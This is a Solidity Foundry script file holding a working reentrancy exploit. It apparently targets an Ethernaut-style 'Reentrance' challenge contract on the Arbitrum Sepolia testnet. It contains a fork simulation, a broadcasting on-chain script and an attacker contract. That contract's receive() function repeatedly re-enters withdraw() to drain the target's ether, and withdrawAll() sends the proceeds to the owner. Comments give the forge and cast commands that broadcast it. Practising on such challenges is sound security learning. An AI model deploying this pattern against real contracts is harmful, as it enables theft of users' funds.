// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
// cast interface src/Reentrance.sol:Reentrance

interface IReentrance {
    function balanceOf(address _who) external view returns (uint256 balance);
    function balances(address) external view returns (uint256);
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

// $ forge script script/ReentranceExp.s.sol:ForkExp --fork-url $ARBITRUM_SEPOLIA_INFURA_URL -vvvvv
// $ forge script script/ReentranceExp.s.sol:ForkExp --fork-url $ARBITRUM_SEPOLIA_RPC_URL -vvvvv
contract ForkExp is Script {
    IReentrance public contractInstance;

    address attacker = makeAddr("attacker");
    uint256 inicialPrize = 0.001 ether;
    uint256 startFunds = 1 ether;

    function run() external {
        vm.deal(attacker, startFunds);
        uint256 chainId = block.chainid;
        console2.log("Chain ID:", chainId);

        if (chainId == 421614) {
            // ARBITRUM_SEPOLIA_RPC_URL
            contractInstance = IReentrance(payable(0x8D8F944A3DbBE9678223200371C662318E218038));
        } else {
            return;
        }
        vm.startPrank(attacker);
        uint256 targetStartBalance = address(contractInstance).balance;
        require(contractInstance.balanceOf(address(attacker)) == 0);
        require(attacker.balance == startFunds);

        contractInstance.donate{value: inicialPrize}(attacker);

        require(contractInstance.balanceOf(address(attacker)) == inicialPrize);
        require(attacker.balance == startFunds - inicialPrize);
        require(address(contractInstance).balance == inicialPrize + targetStartBalance);

        Attacter attackerInstance = new Attacter(payable(address(contractInstance)));

        require(address(attackerInstance).balance == 0);
        require(contractInstance.balanceOf(address(attackerInstance)) == 0);

        attackerInstance.attack{value: inicialPrize}();

        console2.log("attacker ETH balance is ", attacker.balance);
        console2.log("attacker contract balance is ", contractInstance.balanceOf(attacker));
        console2.log("contractInstance ETH balance is ", address(contractInstance).balance);
        console2.log("attackerContract ETH balance is ", address(attackerInstance).balance);
        attackerInstance.withdrawAll();
        console2.log("attacker ETH balance after withdraw is ", attacker.balance);
        vm.stopPrank();
    }
}

// $ forge script script/ReentranceExp.s.sol:onChainExp --fork-url $ARBITRUM_SEPOLIA_INFURA_URL --sender $ACCOUNT_SEPOLIA -vvvvv
// $ forge script script/ReentranceExp.s.sol:onChainExp --rpc-url $ARBITRUM_SEPOLIA_RPC_URL --account updraft --broadcast --sender $ACCOUNT_SEPOLIA -vvvvv
// $ forge script script/ReentranceExp.s.sol:onChainExp --rpc-url $ARBITRUM_SEPOLIA_INFURA_URL --account updraft --broadcast --sender $ACCOUNT_SEPOLIA -vvvvv
// $ make reentranceExp ARGS='--network arbiSepolia'
// cast storage 0x8D8F944A3DbBE9678223200371C662318E218038 1 --rpc-url $ARBITRUM_SEPOLIA_RPC_URL
// cast balance 0x259518110C1B22e09D788b154Bf9fe77C4dEE545 --rpc-url $ARBITRUM_SEPOLIA_RPC_URL
contract onChainExp is Script {
    IReentrance public contractInstance = IReentrance(payable(0x259518110C1B22e09D788b154Bf9fe77C4dEE545));
    uint256 attackMount = 0.001 ether; // 0.001 ether

    function run() external {
        address attacker = tx.origin;
        vm.startBroadcast(attacker);

        Attacter attackerInstance = new Attacter(payable(address(contractInstance)));
        console2.log("tx.origin ETH balance is ", attacker.balance);
        console2.log("attacker ETH balance is ", address(attackerInstance).balance);
        console2.log("target ETH balance is ", address(contractInstance).balance);
        attackerInstance.attack{value: attackMount}();
        console2.log("attacker ETH balance is ", address(attackerInstance).balance);
        console2.log("target ETH balance is ", address(contractInstance).balance);
        attackerInstance.withdrawAll();
        console2.log("tx.origin ETH balance after withdraw is ", attacker.balance);
        console2.log("attacker ETH balance after withdraw is ", address(attackerInstance).balance);
        vm.stopBroadcast();
    }
}

contract Attacter {
    IReentrance public targetContract;
    address public owner;
    uint256 attackMount;

    constructor(address payable _contractInstance) payable {
        targetContract = IReentrance(_contractInstance);
        owner = msg.sender;
    }

    function attack() public payable {
        attackMount = msg.value;
        targetContract.donate{value: attackMount}(address(this));
        targetContract.withdraw(attackMount);
    }

    function withdrawAll() external {
        payable(owner).transfer(address(this).balance);
    }

    // 接收 ETH 并进行重入
    receive() external payable {
        uint256 balance = address(targetContract).balance;
        if (balance >= attackMount) {
            targetContract.withdraw(attackMount);
        } else if (balance > 0) {
            targetContract.withdraw(balance);
        }
    }
}
